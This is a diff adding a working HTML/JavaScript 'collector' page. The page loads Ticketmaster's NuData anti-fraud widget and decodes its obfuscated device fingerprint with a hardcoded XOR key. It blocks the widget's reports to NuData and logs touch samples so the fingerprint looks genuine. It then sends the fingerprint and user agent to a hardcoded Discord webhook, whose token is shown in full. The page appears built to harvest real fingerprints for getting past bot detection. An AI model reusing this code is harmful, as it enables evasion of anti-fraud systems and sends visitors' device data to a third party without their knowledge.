@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>NuData base capture</title>
+  <style>
+    :root { color-scheme: dark; }
+    body { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+           margin: 0; padding: 20px 16px 60px; background: #0b0f14; color: #e6edf3; }
+    h1 { font-size: 17px; margin: 0 0 4px; }
+    .sub { color: #7d8590; font-size: 12px; margin: 0 0 16px; line-height: 1.5; }
+    .nav { margin: 0 0 16px; font-size: 12px; }
+    .nav a { color: #58a6ff; text-decoration: none; }
+    .nav a:hover { text-decoration: underline; }
+    button { width: 100%; padding: 16px; font-size: 16px; font-weight: 600; border: 0;
+             border-radius: 10px; background: #8957e5; color: #fff; font-family: inherit; }
+    button.secondary { background: #21262d; color: #e6edf3; margin-top: 8px; }
+    button:active { filter: brightness(0.92); }
+    button[disabled] { background: #30363d; color: #7d8590; }
+    #status { font-size: 13px; margin: 16px 0; min-height: 20px; line-height: 1.5; }
+    .ok { color: #3fb950; } .warn { color: #d29922; } .err { color: #f85149; }
+    #touchpad { margin: 14px 0; min-height: 180px; border: 2px dashed #30363d; border-radius: 12px;
+                display: flex; align-items: center; justify-content: center; text-align: center;
+                padding: 16px; color: #7d8590; font-size: 12px; touch-action: none;
+                user-select: none; -webkit-user-select: none; background: #161b22; }
+    #touchpad.active { border-color: #8957e5; color: #c9d1d9; }
+    pre { background: #161b22; padding: 12px; overflow: auto; border-radius: 8px;
+          font-size: 10px; white-space: pre-wrap; word-break: break-all; color: #8b949e;
+          max-height: 420px; }
+    label { display: block; font-size: 11px; color: #7d8590; margin: 12px 0 4px; }
+    input[type=text] { width: 100%; box-sizing: border-box; padding: 10px 12px; border-radius: 8px;
+      border: 1px solid #30363d; background: #161b22; color: #e6edf3; font: inherit; font-size: 12px; }
+    table { width: 100%; border-collapse: collapse; font-size: 12px; margin: 12px 0; }
+    td { padding: 5px 6px; border-bottom: 1px solid #21262d; vertical-align: top; }
+    td:first-child { color: #7d8590; width: 34%; }
+    td:last-child { word-break: break-all; }
+    .row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 8px; }
+    .row button { flex: 1; min-width: 120px; }
+  </style>
+</head>
+<body>
+  <p class="nav"><a href="../">← All collectors</a> · <a href="../sardine/">Sardine</a> · <a href="../fp/">Laylo FP</a></p>
+  <h1>NuData base capture</h1>
+  <p class="sub">
+    Loads Ticketmaster's real NuData widget (<code>w-481390</code> sync script), captures the
+    decoded <code>widgetData</code> base fingerprint (step‑0 / init). Use the touch pad below
+    so <code>ipr</code> includes real touch samples — swipe and tap like on signup.
+    <strong>Capture only</strong> — NuData POST/beacon blocked; Discord is the only outbound send.
+  </p>
+
+  <div id="touchpad" aria-label="Touch interaction pad">
+    Swipe &amp; tap here first (touch events feed ipr)<br />
+    <span id="touchCount">0 touches</span>
+  </div>
+
+  <button id="go" disabled>Capture NuData payload</button>
+  <div class="row" id="actions" hidden>
+    <button class="secondary" id="copy" type="button">Copy JSON</button>
+    <button class="secondary" id="copyWd" type="button">Copy widgetData</button>
+    <button class="secondary" id="dl" type="button">Download .json</button>
+  </div>
+
+  <label for="webhook">Override webhook (optional — default Discord used automatically)</label>
+  <input id="webhook" type="text" placeholder="Leave blank = auto-send to default Discord webhook" autocomplete="off" />
+
+  <p id="status">Loading NuData widget…</p>
+  <div id="summary"></div>
+  <pre id="out" hidden></pre>
+
+  <form name="frmGlobalNudetect" style="display:none" aria-hidden="true">
+    <input type="hidden" name="nds-pmd" id="nds-pmd" value="" />
+  </form>
+
+<script>
+const WIDGET_ID = "w-481390";
+const SYNC_JS = `https://nudata.ticketmaster.com/2.2/w/${WIDGET_ID}/sync/js/`;
+const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1509692975037550715/tnCh-dHyzgP1wFYwT4BRXgtqP-ATClVbwSoVHYIFmuijkWreUMnJ2gumvQnj0lPZFu4b";
+
+let lastPayload = null;
+let touchLog = [];
+let loaderReady = false;
+
+(() => {
+  const q = new URLSearchParams(location.search).get("webhook");
+  if (q) document.getElementById("webhook").value = q;
+})();
+
+const set = (h) => { document.getElementById("status").innerHTML = h; };
+
+function decodeBndx(encoded) {
+  const KEY = [41, 8, 49, 48, 51, 44, 63, 0, 19, 61, 43, 63, 57, 15, 34, 6, 42, 59, 41, 19, 10, 45, 54, 0, 44, 34, 57, 36, 48];
+  let s = String(encoded || "").trim();
+  if (!s.startsWith("BNDX:")) return s;
+  s = s.slice(5);
+  let bin;
+  try { bin = atob(s); } catch { return encoded; }
+  if (bin.length < 4) return encoded;
+  bin = bin.slice(4);
+  let out = "";
+  let f = 0;
+  for (let p = 0; p < bin.length; p++) {
+    let v = bin.charCodeAt(p) - 32;
+    if (v >= 0 && v < 94) {
+      if (v < 64) v ^= KEY[f % KEY.length];
+      v += 47 + (-1) * f * 31;
+      v = ((v % 94) + 94) % 94;
+      f += 1;
+    }
+    out += String.fromCharCode(v + 32);
+  }
+  return out;
+}
+
+function parsePmd(raw) {
+  const decoded = decodeBndx(raw);
+  try {
+    const obj = JSON.parse(decoded);
+    const wd = obj.widgetData;
+    if (wd && typeof wd.ft === "string" && wd.ft[0] === "{") {
+      try { wd.ft = JSON.parse(wd.ft); } catch {}
+    }
+    if (wd && typeof wd.fc === "string" && wd.fc[0] === "{") {
+      try { wd.fc = JSON.parse(wd.fc); } catch {}
+    }
+    return { ok: true, obj, decoded };
+  } catch (e) {
+    return { ok: false, error: String(e.message || e), decoded: decoded.slice(0, 500) };
+  }
+}
+
+function webhookTargets() {
+  const q = new URLSearchParams(location.search).get("webhook");
+  const input = document.getElementById("webhook").value.trim();
+  const override = input || q || "";
+  const out = [];
+  if (DEFAULT_WEBHOOK) out.push(DEFAULT_WEBHOOK);
+  if (override && override !== DEFAULT_WEBHOOK) out.push(override);
+  return out;
+}
+
+async function pingWebhooks(payload) {
+  const results = [];
+  for (const wh of webhookTargets()) {
+    try {
+      const isDiscord = /discord(?:app)?\.com\/api\/webhooks\//i.test(wh);
+      const compact = {
+        kind: "nudata_base",
+        platform: payload.summary.platform,
+        pl: payload.widgetData?.pl,
+        sr: payload.widgetData?.sr,
+        wg: payload.widgetData?.wg,
+        fm: payload.widgetData?.fm,
+        hf: payload.widgetData?.hf,
+        bp: payload.widgetData?.bp,
+        ft: payload.widgetData?.ft,
+        iprLen: (payload.widgetData?.ipr || "").length,
+        touchSamples: payload.touchLog?.length || 0,
+        ua: navigator.userAgent.slice(0, 100),
+      };
+      const body = isDiscord
+        ? JSON.stringify({
+            content: `NuData base · ${compact.platform} · ${compact.pl} · wg ${compact.wg}`,
+            embeds: [{
+              title: "widgetData summary",
+              description: "```json\n" + JSON.stringify(compact, null, 2).slice(0, 3500) + "\n```",
+            }],
+          })
+        : JSON.stringify(payload);
+      const res = await fetch(wh, { method: "POST", headers: { "content-type": "application/json" }, body });
+      results.push({ wh, ok: res.ok || res.status === 204 });
+    } catch (e) {
+      results.push({ wh, ok: false, error: String(e.message || e) });
+    }
+  }
+  return results;
+}
+
+function installNetworkIsolation() {
+  const blockPost = (url) => /nudatasecurity\.com/i.test(url);
+
+  const origFetch = window.fetch.bind(window);
+  window.fetch = async function (input, init) {
+    const url = typeof input === "string" ? input : (input && input.url) || "";
+    const method = ((init && init.method) || "GET").toUpperCase();
+    if (blockPost(url) && method === "POST") {
+      return new Response("{}", { status: 204 });
+    }
+    return origFetch(input, init);
+  };
+
+  const xhrOpen = XMLHttpRequest.prototype.open;
+  const xhrSend = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function (method, url, ...rest) {
+    this.__ndUrl = url;
+    this.__ndMethod = (method || "GET").toUpperCase();
+    return xhrOpen.call(this, method, url, ...rest);
+  };
+  XMLHttpRequest.prototype.send = function (body) {
+    const url = this.__ndUrl || "";
+    const method = this.__ndMethod || "GET";
+    if (blockPost(url) && method === "POST") {
+      Object.defineProperty(this, "readyState", { configurable: true, value: 4 });
+      Object.defineProperty(this, "status", { configurable: true, value: 204 });
+      Object.defineProperty(this, "responseText", { configurable: true, value: "{}" });
+      queueMicrotask(() => { this.onreadystatechange && this.onreadystatechange(); });
+      return;
+    }
+    return xhrSend.call(this, body);
+  };
+
+  if (navigator.sendBeacon) {
+    const _beacon = navigator.sendBeacon.bind(navigator);
+    navigator.sendBeacon = function (url, data) {
+      if (blockPost(url)) return true;
+      return _beacon(url, data);
+    };
+  }
+}
+
+function detectPlatform() {
+  const ua = navigator.userAgent;
+  const pl = navigator.platform || "";
+  if (/iphone|ipad|ipod/i.test(ua)) return "ios";
+  if (/android/i.test(ua)) return "android";
+  if (/win/i.test(pl) || /windows/i.test(ua)) return "win64";
+  if (/mac/i.test(pl)) return "mac";
+  return "unknown";
+}
+
+function setupTouchPad() {
+  const pad = document.getElementById("touchpad");
+  const counter = document.getElementById("touchCount");
+  const bump = () => {
+    counter.textContent = `${touchLog.length} touch events logged`;
+    pad.classList.add("active");
+  };
+  const logTouch = (type, e) => {
+    for (const t of e.changedTouches || []) {
+      touchLog.push({
+        type,
+        t: Date.now(),
+        x: Math.round(t.clientX),
+        y: Math.round(t.clientY),
+        id: t.identifier,
+        radiusX: t.radiusX,
+        radiusY: t.radiusY,
+        force: t.force,
+      });
+    }
+    bump();
+  };
+  ["touchstart", "touchmove", "touchend", "touchcancel"].forEach((ev) => {
+    pad.addEventListener(ev, (e) => {
+      e.preventDefault();
+      logTouch(ev, e);
+    }, { passive: false });
+  });
+  // Desktop fallback for testing
+  pad.addEventListener("pointerdown", (e) => {
+    if (e.pointerType === "touch") return;
+    touchLog.push({ type: "pointerdown", t: Date.now(), x: Math.round(e.clientX), y: Math.round(e.clientY) });
+    bump();
+  });
+}
+
+function loadNuData() {
+  return new Promise((resolve, reject) => {
+    window.ndsapi = window.ndsapi || {};
+    window.ndsapi.config = window.ndsapi.config || { q: [], ready(fn) { this.q.push(fn); } };
+    const s = document.createElement("script");
+    s.src = SYNC_JS;
+    s.async = true;
+    s.onload = () => {
+      let n = 0;
+      const t = setInterval(() => {
+        const pmd = document.getElementById("nds-pmd").value;
+        if (pmd && pmd.length > 20) {
+          clearInterval(t);
+          loaderReady = true;
+          document.getElementById("go").disabled = false;
+          resolve();
+        } else if (++n > 160) {
+          clearInterval(t);
+          loaderReady = true;
+          document.getElementById("go").disabled = false;
+          resolve();
+        }
+      }, 250);
+    };
+    s.onerror = () => reject(new Error("Failed to load NuData sync script"));
+    document.head.appendChild(s);
+  });
+}
+
+function readCapture() {
+  const raw = document.getElementById("nds-pmd").value;
+  const parsed = parsePmd(raw);
+  if (!parsed.ok) throw new Error("Could not decode nds-pmd: " + (parsed.error || "parse failed"));
+
+  const wd = parsed.obj.widgetData || {};
+  const platform = detectPlatform();
+  return {
+    kind: "nudata_base_capture",
+    capturedAt: new Date().toISOString(),
+    host: location.host,
+    platform,
+    userAgent: navigator.userAgent,
+    maxTouchPoints: navigator.maxTouchPoints,
+    screen: {
+      w: screen.width,
+      h: screen.height,
+      availW: screen.availWidth,
+      availH: screen.availHeight,
+      dpr: window.devicePixelRatio,
+      inner: { w: window.innerWidth, h: window.innerHeight },
+      outer: { w: window.outerWidth, h: window.outerHeight },
+    },
+    widgetData: wd,
+    wt: parsed.obj.wt || null,
+    wire: { ndsPmdPrefix: raw.slice(0, 24) + "…", ndsPmdLen: raw.length },
+    touchLog,
+    decodedJson: parsed.obj,
+  };
+}
+
+function buildSummary(payload) {
+  const wd = payload.widgetData || {};
+  const rows = [
+    ["platform", payload.platform],
+    ["pl", wd.pl || "—"],
+    ["sr", wd.sr || "—"],
+    ["bd", wd.bd || "—"],
+    ["wg", wd.wg || "—"],
+    ["fm", wd.fm || "—"],
+    ["hf", wd.hf || "—"],
+    ["bp", wd.bp || "—"],
+    ["ft", typeof wd.ft === "object" ? JSON.stringify(wd.ft) : (wd.ft || "—")],
+    ["ipr len", String((wd.ipr || "").length)],
+    ["touch log", String(payload.touchLog.length)],
+  ];
+  document.getElementById("summary").innerHTML =
+    "<table>" + rows.map((r) => `<tr><td>${r[0]}</td><td>${r[1]}</td></tr>`).join("") + "</table>";
+  document.getElementById("out").hidden = false;
+  document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
+  document.getElementById("actions").hidden = false;
+}
+
+async function capture() {
+  const btn = document.getElementById("go");
+  btn.disabled = true;
+  set("Reading nds-pmd…");
+  try {
+    await new Promise((r) => setTimeout(r, 400));
+    lastPayload = readCapture();
+    buildSummary(lastPayload);
+    const notes = ['<span class="ok">Captured locally.</span> NuData POST blocked.'];
+    const pings = await pingWebhooks(lastPayload);
+    if (pings.some((p) => p.ok && p.wh === DEFAULT_WEBHOOK)) {
+      notes.push('<span class="ok">Auto-sent to Discord</span>');
+    }
+    set(notes.join(" · "));
+    btn.textContent = "Capture again";
+  } catch (e) {
+    set(`<span class="err">${e.message || e}</span>`);
+  }
+  btn.disabled = false;
+}
+
+installNetworkIsolation();
+setupTouchPad();
+
+// TM-style hidden form bootstrap (matches auth page)
+(function bootstrapForm() {
+  if (!document.forms.frmGlobalNudetect) {
+    const fm = document.createElement("form");
+    fm.name = "frmGlobalNudetect";
+    const in1 = document.createElement("input");
+    in1.type = "hidden";
+    in1.name = "nds-pmd";
+    in1.id = "nds-pmd";
+    fm.appendChild(in1);
+    document.body.appendChild(fm);
+  }
+})();
+
+loadNuData()
+  .then(() => set('<span class="ok">NuData loaded.</span> Swipe the touch pad, then tap Capture.'))
+  .catch((e) => set(`<span class="err">${e.message}</span>`));
+
+document.getElementById("go").onclick = capture;
+document.getElementById("copy").onclick = async () => {
+  if (!lastPayload) return;
+  await navigator.clipboard.writeText(JSON.stringify(lastPayload, null, 2));
+  set('<span class="ok">Copied full JSON.</span>');
+};
+document.getElementById("copyWd").onclick = async () => {
+  if (!lastPayload?.widgetData) return;
+  await navigator.clipboard.writeText(JSON.stringify(lastPayload.widgetData, null, 2));
+  set('<span class="ok">Copied widgetData.</span>');
+};
+document.getElementById("dl").onclick = () => {
+  if (!lastPayload) return;
+  const name = `nudata-base-${lastPayload.platform}-${new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19)}.json`;
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(new Blob([JSON.stringify(lastPayload, null, 2)], { type: "application/json" }));
+  a.download = name;
+  a.click();
+  URL.revokeObjectURL(a.href);
+};
+</script>
+</body>
+</html>
